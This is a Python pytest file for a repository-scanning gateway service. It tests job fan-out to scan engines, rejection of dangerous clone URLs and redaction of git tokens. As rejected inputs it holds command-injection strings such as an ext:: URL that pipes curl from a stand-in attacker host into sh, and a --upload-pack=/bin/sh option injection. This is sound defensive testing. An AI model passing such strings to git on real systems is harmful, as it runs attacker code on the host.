import json
import pytest
from unittest.mock import patch, AsyncMock, MagicMock

from src.services.gateway.service import GatewayService


def _service(fake_redis):
    with patch("src.services.gateway.service.get_redis_client", return_value=fake_redis):
        return GatewayService()


@pytest.mark.asyncio
@patch("src.services.gateway.service.asyncio.to_thread")
async def test_process_job_fans_out_to_every_engine(mock_to_thread, fake_redis):
    async def runner(func, *args, **kwargs):
        return "s3://test-uri/code.zip" if func.__name__ == "upload_codebase" else None
    mock_to_thread.side_effect = runner

    service = _service(fake_redis)
    await service.process_job("job-1", {
        "cloneUrl": "https://github.com/test/repo",
        "commitSha": "abc1234",
        "scanId": "scan-1",
    })

    channels = [c for c, _ in fake_redis.published]
    assert set(channels) == {"scan:semgrep", "scan:regex", "scan:sonarqube", "scan:codeql"}

    body = json.loads(fake_redis.published[0][1])
    assert body["job_id"] == "job-1"
    assert body["scan_id"] == "scan-1"
    assert body["uri"] == "s3://test-uri/code.zip"
    assert body["commit_sha"] == "abc1234"


@pytest.mark.asyncio
@patch("src.services.gateway.service.execute_query", new_callable=AsyncMock)
@patch("src.services.gateway.service.get_cloudflare_secret", new_callable=AsyncMock)
@patch("src.services.gateway.service.asyncio.to_thread")
async def test_process_job_marks_failure_and_publishes_nothing(
    mock_to_thread, mock_secret, mock_exec, fake_redis
):
    mock_secret.side_effect = ValueError("no token")
    mock_to_thread.side_effect = Exception("Clone failed")

    service = _service(fake_redis)
    await service.process_job("job-1", {
        "cloneUrl": "https://github.com/o/r.git", "commitSha": "abc", "scanId": "scan-1",
    })

    assert fake_redis.published == []
    assert mock_exec.await_count == 2

    job_sql, job_payload, job_id = mock_exec.await_args_list[0][0]
    assert "failed" in job_sql
    assert "Clone failed" in job_payload
    assert job_id == "job-1"

    scan_sql = mock_exec.await_args_list[1][0][0]
    assert "security_scans" in scan_sql


def test_detect_language_by_manifest(tmp_path):
    (tmp_path / "package.json").write_text("{}")
    with patch("src.services.gateway.service.get_redis_client", return_value=MagicMock()):
        assert GatewayService()._detect_language(str(tmp_path)) == "javascript"


def test_detect_language_falls_back_to_unknown(tmp_path):
    (tmp_path / "notes.txt").write_text("nothing to detect")
    with patch("src.services.gateway.service.get_redis_client", return_value=MagicMock()):
        assert GatewayService()._detect_language(str(tmp_path)) == "unknown"


# --- clone URL validation -------------------------------------------------

import os
from src.services.gateway.service import validate_clone_url, redact_credentials


@pytest.mark.parametrize("url", [
    "https://github.com/org/repo.git",
    "https://gitlab.self-hosted.example.com/team/repo.git",
    "  https://github.com/org/repo.git  ",
])
def test_validate_clone_url_accepts_https(url):
    assert validate_clone_url(url) == url.strip()


@pytest.mark.parametrize("url,reason", [
    ("ext::sh -c 'curl evil.example.com|sh'", "ext:: runs an arbitrary command"),
    ("file:///etc", "file:// reaches the local filesystem"),
    ("ssh://git@internal/repo.git", "ssh:// reaches internal hosts"),
    ("git://github.com/org/repo.git", "git:// is unauthenticated and not https"),
    ("--upload-pack=/bin/sh", "git would parse this as an option"),
    ("https://", "no host"),
    ("", "empty"),
    ("   ", "whitespace only"),
])
def test_validate_clone_url_rejects_dangerous_input(url, reason):
    with pytest.raises(ValueError):
        validate_clone_url(url)


@patch.dict(os.environ, {"ALLOWED_CLONE_HOSTS": "github.com, gitlab.com"})
def test_allowed_clone_hosts_is_enforced_when_set():
    assert validate_clone_url("https://github.com/org/repo.git")
    with pytest.raises(ValueError, match="ALLOWED_CLONE_HOSTS"):
        validate_clone_url("https://evil.example.com/org/repo.git")


@patch.dict(os.environ, {}, clear=True)
def test_any_https_host_allowed_when_unset():
    """Self-hosted GitLab is in scope, so host restriction is opt-in."""
    assert validate_clone_url("https://git.internal.example.com/team/repo.git")


# --- credential handling --------------------------------------------------

@pytest.mark.parametrize("raw,expected", [
    ("https://user:ghp_secret@github.com/o/r.git", "https://***@github.com/o/r.git"),
    ("clone of https://x-access-token:abc123@gitlab.com/o/r.git failed",
     "clone of https://***@gitlab.com/o/r.git failed"),
    ("https://github.com/o/r.git", "https://github.com/o/r.git"),
    ("", ""),
])
def test_redact_credentials(raw, expected):
    assert redact_credentials(raw) == expected


@pytest.mark.asyncio
@patch("src.services.gateway.service.execute_query", new_callable=AsyncMock)
@patch("src.services.gateway.service.get_cloudflare_secret", new_callable=AsyncMock)
@patch("src.services.gateway.service.asyncio.to_thread")
async def test_token_never_leaks_into_logs_or_database(mock_to_thread, mock_secret, mock_exec, fake_redis, capsys):
    """
    The injected token exists only in the URL handed to git. A clone failure
    previously wrote str(err) — which carries the full URL — straight to stdout
    and pgboss.job.output.
    """
    mock_secret.return_value = "ghp_supersecret"
    mock_to_thread.side_effect = Exception(
        "Cmd('git') failed: clone https://x-access-token:ghp_supersecret@github.com/o/r.git"
    )

    service = _service(fake_redis)
    await service.process_job("job-1", {
        "cloneUrl": "https://github.com/o/r.git", "commitSha": "abc", "scanId": "scan-1",
    })

    written = mock_exec.await_args_list[0][0][1]
    assert "ghp_supersecret" not in written
    assert "***@github.com" in written
    assert "ghp_supersecret" not in capsys.readouterr().out


@pytest.mark.asyncio
@patch("src.services.gateway.service.get_cloudflare_secret", new_callable=AsyncMock)
@patch("src.services.gateway.service.asyncio.to_thread")
async def test_token_is_injected_but_never_published(mock_to_thread, mock_secret, fake_redis):
    mock_secret.return_value = "ghp_supersecret"

    async def runner(func, *args, **kwargs):
        return "s3://b/codebases/scan-1.zip" if func.__name__ == "upload_codebase" else None
    mock_to_thread.side_effect = runner

    service = _service(fake_redis)
    await service.process_job("job-1", {
        "cloneUrl": "https://github.com/o/r.git", "commitSha": "abc", "scanId": "scan-1",
    })

    clone_url_used = mock_to_thread.call_args_list[0][0][1]
    assert clone_url_used == "https://x-access-token:ghp_supersecret@github.com/o/r.git"
    for _, msg in fake_redis.published:
        assert "ghp_supersecret" not in msg


@pytest.mark.asyncio
@patch("src.services.gateway.service.get_cloudflare_secret", new_callable=AsyncMock)
@patch("src.services.gateway.service.asyncio.to_thread")
async def test_missing_token_clones_anonymously(mock_to_thread, mock_secret, fake_redis):
    """Public repositories must still clone when no token is configured."""
    mock_secret.side_effect = ValueError("Secret 'GIT_CLONE_TOKEN' not found")

    async def runner(func, *args, **kwargs):
        return "s3://b/codebases/scan-1.zip" if func.__name__ == "upload_codebase" else None
    mock_to_thread.side_effect = runner

    service = _service(fake_redis)
    await service.process_job("job-1", {
        "cloneUrl": "https://github.com/o/r.git", "commitSha": "abc", "scanId": "scan-1",
    })

    assert mock_to_thread.call_args_list[0][0][1] == "https://github.com/o/r.git"
    assert len(fake_redis.published) == 4


@pytest.mark.asyncio
@patch("src.services.gateway.service.execute_query", new_callable=AsyncMock)
async def test_rejected_url_fails_the_job_without_cloning(mock_exec, fake_redis):
    service = _service(fake_redis)
    await service.process_job("job-1", {
        "cloneUrl": "ext::sh -c 'id'", "commitSha": "abc", "scanId": "scan-1",
    })

    assert fake_redis.published == []
    assert mock_exec.await_count == 2
    assert "not allowed" in mock_exec.await_args_list[0][0][1]
